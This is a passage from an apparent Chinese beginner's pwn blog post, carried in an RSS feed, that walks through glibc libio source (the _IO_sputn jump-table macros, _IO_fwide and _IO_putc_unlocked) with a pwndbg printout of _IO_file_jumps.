libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)<span class="comment">// line379</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)<span class="comment">// line176</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)<span class="comment">// line125</span></span></span><br></pre></td></tr></table></figure><p>用pwndbg调一下发现<code>__xsputn</code>指向的是一个叫<code>_IO_new_file_xsputn</code>的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">...</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7e493d0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_fwide有一个宏的定义和一个函数的定义，我们主要就看函数的定义就行了，可以发现在这里会把IOwrite_ptr改为IOwrite_base的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return orientation of stream.  If mode is nonzero try to change</span></span><br><span class="line"><span class="comment">   the orientation first.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_fwide</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fwide (FILE *fp, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/// pass</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the orientation appropriately.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/// pass</span></span><br></pre></td></tr></table></figure><p><code>_IO_putc_unlocked</code>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/libio.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_putc_unlocked(_ch, _fp) __putc_unlocked_body (_ch, _fp)</span></span><br><span class="line"><span class="comment">// In libio/bits/types/struct_FILE.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __putc_unlocked_body(_ch, _fp)\</span></span><br><span class="line"><span class="meta">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)\</span></span><br><span class="line"><span class="meta">   ? __overflow (_fp, (unsigned char) (_ch))\</span></span><br><span class="line"><span class="meta">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
